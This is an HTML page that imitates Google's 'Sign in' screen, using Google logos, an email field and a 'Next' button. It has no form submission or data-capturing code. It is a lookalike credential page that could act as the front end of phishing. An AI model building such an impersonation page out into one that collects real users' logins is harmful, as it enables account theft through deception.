<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login-google</title>
    <link rel="shortcut icon" href="img/google-logo.jpg" type="image/x-icon">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/default.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    



<div class="login-area">
    <div class="container">
        <div class="row">
            <div class="col-xl-3"></div>
            <div class="col-xl-6">
                <div class="login">
                    <div class="login-text">
                        <div class="login-text-part text-center">
                            <h1><img src="img/google.png" alt=""></h1>
                            <h2>Sign in</h2>
                            <h3>Use your Google Account</h3>
                        </div>
                        <input class="input" type="Email" placeholder="Email ID or phone number">
                        <h5>Forgot your email id?</h5>
                        <p>Not your computer? Then use guest mode to sign in personally. <a href="#">Learn more</a></p>
                        <div class="create-user">
                            <a href="#">Create an account</a>
                            <button>Next</button>
                        </div>
                    </div>
                </div>
            </div>
           <div class="col-xl-3"></div>
        </div>
    </div>
</div>







<script src="js/bootstrap.min.js"></script>

</body>
</html>
